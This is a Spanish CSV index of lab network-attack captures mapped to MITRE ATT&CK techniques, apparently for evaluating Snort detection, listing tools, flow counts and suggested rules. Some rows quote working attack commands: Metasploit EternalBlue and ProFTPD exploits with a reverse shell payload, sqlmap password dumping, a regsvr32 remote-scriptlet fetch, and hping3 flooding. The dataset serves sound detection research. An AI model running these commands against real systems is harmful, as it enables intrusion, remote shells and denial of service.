TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Credential Access,-,TA0006,Forced Authentication,T1187,-,-,Forzar intento de autenticación en un servidor para obtener credenciales de acceso,"SMB, NTLMssp-Extract",T1187-Forced_Authentication_[5].pcapng,SMB2,8,1,0,1,3,3,0,-,SI,"Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV",Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas,Manual [5] / 4.5.1,Manual [5] / C.4,Manual [5] / 5.7.4,1,1,0,1,0,1,LV1,Forzar un intento de autenticación siempre es un ataque,L3,0,1
Credential Access,-,TA0006,Forced Authentication,T1187,-,-,Forzar intento de autenticación en un servidor para obtener credenciales de acceso,"SMB, NTLMssp-Extract",T1187-Forced_Authentication2_[5].pcapng,SMB2,3,1,0,1,3,3,0,-,SI,"Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV",Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas,Manual [5] / 4.5.1,Manual [5] / C.4,Manual [5] / 5.7.4,1,1,0,1,0,1,LV1,Forzar un intento de autenticación siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Drive-by Compromise,T1189,-,-,HTML Exploit I - HTML Compilador,"Apache, Shadyantra",T1189-Drive-by_compromise_v1_[4].pcapng,HTTP,4,3,0,3,3,3,0,-,SI,Regla que detecte el aprovechamiento de una vulnerabilidad del navegador Mozilla Firefox para llevar a cabo una compilación de código en la víctima,Carga de página web con exploit HTML para compilar código malware (no ejecutar),Manual [4] / 3.4,Manual [4] / B.4,Manual [4] / 4.4,1,1,0,1,0,1,LV1,El uso de un exploit para compilar código en la víctima siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Drive-by Compromise,T1189,-,-,HTML Exploit II - Descarga de Ejecutable,"Apache, Shadyantra",T1189-Drive-by_compromise_v2_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte la descarga no autorizada de un archivo .exe (ejecutable) en el equipo víctima desde una página web posiblemente fraudulenta,Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe,Manual [4] / 3.4,Manual [4] / B.4,Manual [4] / 4.4,1,1,0,1,0,1,LV2,La descarga no autorizada de un ejecutable no siempre es un ataque,L3,0,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Damn Vulnerable Web App (DVWA),T1190-Sql_injection-C2018_[6].pcapng,HTTP,50,35,0,38,38,38,0,-,SI,Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML,-,Dataset CIC-2018,Manual [4] / B.34,Dataset CIC-2018,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Sqlmap,T1190-Sql_inyection1_[3].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.,Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords,Manual [3] / 3.8.5,Manual [3] / 3.8.5.4,Manual [3] / 3.8.5.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,"curl, DVWA",T1190-SQL_Injection_High_Bytes1_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento de inyección SQL en la URL de una petición,Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno,Manual [4] / 3.26,Manual [4] / B.39,Manual [4] / 4,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,"curl, DVWA",T1190-SQL_Injection_High_Bytes2_[4].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte un posible intento de inyección SQL en la URL de una petición,Instalado un servidor DVWA (servidor con vulnerabilidades) se realiza una inyección SQL a una URL añadiendo caracteres de relleno,Manual [4] / 3.26,Manual [4] / B.39,Manual [4] / 4,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,1,1
Initial Access,-,TA0001,Exploit Public-Facing Application,T1190,-,-,Inyección SQL,Sqlmap,T1190-Sql_inyection2_[2].pcapng,HTTP,77,76,0,76,76,76,0,-,SI,Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.,Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords,Manual [2] / 3.1.3.1,Manual [4] / B.28,Manual [2] / 4.1.1.2,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Persistence,Defense Evasion,TA0003,BITS Jobs,T1197,-,-,Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo,"BITSADMIN,METASPLOIT",T1197-BITS_Jobs_[5].pcapng,TCP,27,9,2,16,18,16,2,Descarga de Malware previa - T1105,SI,"Regla genérica que detecte la presencia de cadenas en el contenido de los paquetes como ""Microsoft BITS"" y "".exe"", alertando del intento de creación de una tarea BITS",Ejecución de comandos para la creación de una tarea BITS con rastro de red,Manual [5] / 4.3.1,Manual [5] / C.5,Manual [5] / 5.5.2,1,1,0,1,0,1,LV2,El establecimiento de tareas BITS puede considerarse como tráfico legítimo o como ataque,L3,1,1
Initial Access,-,TA0001,Trusted Relationship,T1199,-,-,Uso de una conexión RDP sin proteger para el acceso a un equipo,RDP,T1199-Trusted_relationship_[4].pcapng,RDP,18,3,0,2,2,2,0,-,SI*,"El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza",-,Manual [4] / 3.5,Manual [4] / B.5,Manual [4] / 4.5,1,1,0,1,0,1,LV2,"El uso de una conexión RDP para ganar acceso a un equipo no siempre constituye un ataque, depende del contexto",L3,0,1
Initial Access,-,TA0001,Hardware Additions,T1200,-,-,Adición de Hardware,SSH Server + USB(Simular USB con MV con SO),T1200-Hardware_Additions_[5].pcapng,SSH,3,1,0,1,1,1,0,-,NO,"Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales","Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.",Manual [5] / 4.2.1,Manual [5] / C.6,Manual [5] / 5.3.4,1,1,0,1,0,1,LV1,Añadir un equipo hardware a una red siempre es un ataque,L3,0,0
Execution,-,TA0002,Exploitation for Client Execution,T1203,-,-,Ataque con Botnet,"Ares, Screenshot and key logging",T1203-C2018_[6].pcapng,-,116,112,0,11053,11053,11053,0,-,NO,-,-,Dataset CIC-2018,Dataset CIC-2018,Manual [4] / B.35,1,1,0,1,0,1,LV1,Un ataque con botnet siempre es un ataque,L3,0,1
Execution,-,TA0002,User Execution,T1204,Malicious Link,T1204.001,Enlace malicioso,wget,T1204.001-malicious_link_[3].pcapng,TCP,1,1,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima),Manual [3] / 3.8.17,Manual [3] / 3.8.17.4,Manual [3] / 3.8.17.5,1,1,0,1,0,1,LV2,Un enlace malicioso a veces puede ser considerado como tráfico legítimo dependiendo de las circuntstancias,L3,0,0
Command and Control,"Defense Evasion, Persistence",TA0040,Traffic Signaling,T1205,Port Knocking,T1205.001,Esconder y activar un puerto de forma remota,Knockd,T1205.001-Port_Knocking_[3].pcapng,TCP,5,1,0,1,1,1,0,-,NO,Detección por anomalías en base a una actividad sospechosa en un puerto concreto,"Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000",Manual [3] / 3.8.11,Manual [3] / 3.8.11.4,Manual [3] / 3.8.11.5,1,1,0,1,0,1,LV1,El Port Knocking siempre se considera un ataque,L3,0,0
Defense Evasion,-,TA0005,Rogue Domain Controller,T1207,-,-,DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory,mimikazt,T1207-Rogue_domain_controller_[4].pcapng,DCERPC,88,1,0,1,1,1,0,-,SI,"Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5), o un intento de aprovechamiento de una vulnerabilidad de la misma",-,Manual [4] / 3.10,Manual [4] / B.10,Manual [4] / 4.10,1,1,0,1,0,1,LV1,El registro de un DC fraudulento para habilitar la manipulación de datos siempre es un ataque (aunque las tareas realizadas posteriormente puedan realizarse también en un entorno legítimo),L3,0,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,EternalBlue,Metasploit,T1210-Eternal_blue_[2].pcapng,SMB,24,2,0,2,2,2,0,-,SI,Regla genérica que detecte uso de EternalBlue,"Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x ""use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit""",Manual [2] / 3.1.7.1,Manual [4] / B.29,Manual [2] / 4.1.1.4,1,1,0,1,0,1,LV1,El aprovechamiento de vulnerabilidades en el servicio SMB para realizar diferentes tareas maliciosas siempre constituye un ataque,L3,1,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,Ejecución de código remoto basado en vulnerabilidades de servidor FTP,Metasploit,T1210-Remote_code_execution_[2].pcapng,FTP,3,1,0,4,4,4,0,-,SI,Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP,"Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x ""use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit""",Manual [2] / 3.1.7.2,Manual [4] / B.30,Manual [2] / 4.2.1.9,1,1,0,1,0,1,LV1,La ejecución de código remoto aprovechando vulnerabilidades en el servidor FTP siempre es un ataque,L3,0,1
Lateral Movement,-,TA0008,Exploitation of Remote Services,T1210,-,-,Ataque Web,"DVWA, In-house selenium framework",T1210-Web_attack-C2018_[6].pcapng,HTTP,260,236,0,1,1,1,0,-,NO,-,-,Dataset CIC-2018,Manual [4] / B.36,Dataset CIC-2018,1,1,0,1,0,1,LV1,Un ataque web siempre es considerado como tal,L3,0,0
Collection,-,TA0009,Data from Information Repositories,T1213,-,-,Inyección SQL,Sqlmap,T1213-SQL_inyection_[3].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte una inyección SQL en la URL de acceso a una página web,Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla,Manual [3] / 3.8.6,Manual [3] / 3.8.6.4,Manual [3] / 3.8.6.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Defense Evasion,-,TA0005,System Binary Proxy Execution,T1218,Regsvr32,T1218.010,Ejecución de COM scriptlet remoto,Regsvr32.exe,T1218.010-COM_Scriptlet_[2].pcapng,TLS,2,1,0,1,1,1,0,-,SI,Regla genérica que detecte un intento de aprovechamiento de la vulnerabilidad del servicio regsvr32 de Windows,Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll,Manual [2] / 3.3.1.1,Manual [5] / C.25,-,1,1,0,1,0,1,LV1,La ejecucion de un scriptlet remoto siempre se considera como un ataque,L3,0,1
Command and Control,-,TA0040,Remote Access Software,T1219,-,-,Uso de TeamViewer para establecer canal de comunicación alternativo,TeamViewer,T1219-RemoteAccessSoftwareLocal_[5].pcapng,UDP,2,1,0,1,1,1,0,-,SI,"Monitorizar tráfico de red correspondiente a softwares de acesso remoto(AnyDesk, TeamViewer...). En su defecto, Deteccion por listas negras/anomalías.",Conexion mediante TeamViewer entre dos equipos,Manual [5] / 4.8.3,Manual [5] / C.7,Manual [5] / 5.11.9,1,1,0,1,0,1,LV2,"Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo",L3,0,1
Command and Control,-,TA0040,Remote Access Software,T1219,-,-,Uso de TeamViewer para establecer canal de comunicación alternativo,TeamViewer,T1219-RemoteAccessSoftwareNAT_[5].pcapng,TCP,145,1,0,8,8,8,0,-,SI,Regla genérica que detecte el uso de la herramienta TeamViewer para obtener el control del software víctima de forma remota,Conexion mediante TeamViewer entre dos equipos,Manual [5] / 4.8.3,Manual [5] / C.7,Manual [5] / 5.11.9,1,1,0,1,0,1,LV2,"Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo",L3,1,1
Defense Evasion,-,TA0005,Template Injection,T1221,-,-,Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido,Sitios web convencionales (Gmail),T1221-Template_Injection_[5].pcapng,-,12,1,1,1,2,1,1,Establecimiento de sesión remota mediante Metasploit - T1059,SI,"Regla genérica que detecte la inyección de macros o plantillas para llevar a cabo un ataque de Phishing, usando como medio mecanismos convencionales de comunicación (mensajes SMTP, por ejemplo)","Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima",Manual [5] / 4.4.1,Manual [5] / C.8,Manual [5] / 5.6.5,1,1,0,1,0,1,LV2,El tráfico puede parecer ser legítimo en una inyección de plantilalas (.DOTM),L3,1,1
Discovery,-,TA0007,Domain Trust Discovery,T1482,-,-,Descubrimiento de dominios de confianza en entorno Active Directory,dsquery,T1482-Domain_trust_discovery_[4].pcapng,LDAP,4,1,0,1,1,1,0,-,NO*,"Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain",-,Manual [4] / 3.13,Manual [4] / B.13,Manual [4] / 4.13,1,1,0,1,0,1,LV2,El descubrimiento de dominios de confianza puede ser una actividad legítima,L3,1,0
Impact,-,TA0040,Defacement,T1491,Internal Defacement,T1491.001,Modificar fondo de pantalla equipo victima,PowerShell,T1491.001-Internal_Defacement_[5].pcapng,TCP,12,1,1,1,2,1,1,Establecimiento de sesión remota mediante Metasploit - T1059,NO,Detectable por listas negras/anomalías,Modificar fondo de pantalla equipo victima,Manual [5] / 4.10.1,Manual [5] / C.9,Manual [5] / 5.13.1,1,1,0,1,0,1,LV2,Esta acción puede considerarse tráfico legítimo,L3,1,0
Impact,-,TA0040,Resource Hijacking,T1496,-,-,Descarga y puesta en marcha de software de criptominado,XMRIG,T1496-Cryptomining_[2].pcapng,-,13,1,0,1,1,1,0,-,NO,Detección por anomalías,Instalacion y uso de software de minado. Comando: wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz,Manual [2] / 3.3.2.1,Manual [5] / C.26,Manual [2] / 4.2.2.3,1,1,0,1,0,1,LV1,El uso de un software de criptominado siempre se considera como un ataque,L3,1,0
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Amplificación DNS,dnsdrdos,T1498-Amplif_dns_[1].pcapng,DNS,5180,5173,1,5173,5173,5173,0,,SI,Regla genérica que detecte un envío masivo de respuestas DNS no solicitadas con un mismo nombre resuelto hacia la red protegida,-,Manual [1] / 3.5.1,Manual [1] / E.14,Manual [4] / 4.1.35 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Siempre se considera como ataque la amplificacion DNS,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Fraggle,hping3,T1498-Fraggle_[1].pcapng,Chargen,1426,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de datagramas UDP hacia un puerto concreto, con fin de saturarlo y causar su inoperatividad",-,Manual [1] / 3.4.5,Manual [1] / E.13,Manual [4] / 4.1.36 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Reflection Amplification,T1498.002,Smurf,hping3,T1498-Smurf_[1].pcapng,ICMP,4,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de respuestas ICMP,-,Manual [1] / 3.3.1,Manual [1] / E.7,Manual [4] / 4.1.37 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,-,-,Inundación de TCBPDU,yersinia,T1498-Tcbpdu_[1].pcapng,STP,57229,1,0,1,1,1,0,-,NO,Fuera del alcance del estudio,-,Manual [1] / 3.2.2,Manual [1] / E.5,Manual [4] / 4.1.38 y Manual [5] / 5.13.3,1,0,0,1,1,1,LV1,Un ataque de inundación siempre se considera como tal,L2 (Switch),0,0
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación HTTP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-HTTP_flood-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Regla que detecte envío masivo de mensajes HTTP,-,Dataset CIC-2018,Manual [4] / B.37,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación tabla MAC,Macof,T1498.001-MAC_table_flood_[3].pcapng,IPv4,1,1,0,1,1,1,0,-,NO,-,Inundacion tabla MAC mediante Macof. Comando: sudo macof -i enp0s9 -d 172.16.1.1,Manual [3] / 3.8.18,Manual [5] / C.27,Manual [3] / 3.18.5 y Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L2 (Switch),0,0
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación TCP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-TCP_flood-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte envío masivo de mensajes TCP,-,Dataset CIC-2018,Manual [4] / B.37,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Caldera, hping3",T1498.001-UDP_flood_[2].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,Inundacion UDP en la red de la víctima. Comando: timeout 10s hping3 --udp --flood 192.168.2.2,Manual [2] / 3.1.10.2,Manual [2],Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-UDP_flood_1-C2018_[6].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,-,Dataset CIC-2018,Manual [5] / C.28,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Network Denial of Service,T1498,Direct Network Flood,T1498.001,Inundación UDP,"Low Orbit Ion Canon (LOIC) for UDP, TCP, or HTTP requests",T1498.001-UDP_flood_2-C2018_[6].pcapng,UDP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte un envío masivo de mensajes UDP con destino el mismo puerto objetivo,-,Dataset CIC-2018,Manual [5] / C.28,Manual [5] / 5.13.3,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Inundación DHCP / Inanición,"DHCPig, yersinia",T1499-Dhcp_flood_[1].pcapng,DHCP,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK)",-,Manual [1] / 2.4.2.1.1,Manual [1] / E.18,Manual [4] / 4.1.39 y Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,El aagotamiento del pool de direcciones de un servidor DHCP siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,LAND,hping3,T1499-Land_[1].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte envío de mensajes TCP SYN procedentes de la misma dirección IP a la que van dirigidos los paquetes. Los puertos origen/destino pueden ser incluso idénticos,-,Manual [1] / 2.3.1.1.5,Manual [1] / E.11,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application or System Exploitation,T1499.004,Suplantación MAC,ip,T1499-Mac_spoof_[1].pcapng,ARP,3,1,0,1,1,1,0,-,SI,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1],Manual [1] / E.2,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,La suplantacion MAC siempre se considera como un ataque,L2 (Switch),0,0
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Reflexión SYN-ACK,hping3,T1499-Reflexion_synack_[1].pcapng,TCP,953,952,0,952,952,952,0,-,SI,Regla que detecte el envío de mensajes TCP SYN-ACK no solicitados previamente por el la red a proteger,-,Manual [1] / 3.4.2,Manual [1] / E.10,Manual [5] / 5.13.2,1,1,0,1,0,0,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Reseteo de Conexión,"ettercap, netwox, nping",T1499-Reseteo_[1].pcapng,TCP,3,1,0,1,1,1,0,-,NO,Detección por anomalías que identifique reseteos de conexión periódicos y desde direcciones sospechosas,-,Manual [1] / 2.3.1.1.6,Manual [1] / E.12,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,Inundación SYN con suplantación,hping3,T1499-Syn_suplantacion_[1].pcapng,TCP,2334,2332,0,2332,2332,2332,0,-,SI,Regla genérica que detecte el envío prolongado de mensajes TCP SYN que dejan los sockets del equipo a proteger en estado SYN-RECV (no se terminan los handshake de las conexiones TCP establecidas),-,Manual [1] / 2.3.1.1.3,Manual [1] / E.9,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,OS Exhaustion Flood,T1499.001,Denegación de servicio a servidor web,Metasploit,T1499.001-OS_Exhaustion_Flood_[3].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el uso de Slowloris para realizar ataque DDos mediante la comprobación de campos de bytes típicos de la herramienta,Uso de metasploit para ataque DoS con herramienta Slowloris. Comando: use auxiliary/dos/http/slowloris,Manual [3] / 3.8.16,Manual [3] / 3.8.16.4,Manual [3] / 3.8.16.5 y Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Envio solicitudes HTTP a baja tasa,Slowhttptest,T1499.02-Slowhttptest-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes HTTP a baja tasa,Uso de Slowhttptest para denegación de servicio a servidor web,Dataset CIC-2018,Manual [5] / C.29,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Service Exhaustion Flood,T1499.002,Envio solicitudes HTTP parciales,Slowloris,T1499.02-Slowloris-C2018_[6].pcapng,TCP,1,1,0,1,1,1,0,-,SI,Regla que detecte el envío de mensajes HTTP parciales o uso de Slowloris,Uso de Slowloris para denegación de servicio a servidor web,Dataset CIC-2018,Manual [5] / C.29,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application Exhaustion Flood,T1499.003,Denegación de servicio a servidor web,GoldenEye,T1499.03-GoldenEye-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Reglas que detecen envío masivo de solicitudes a servidor web,Uso de GoldenEye para denegación de servicio a servidor web,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
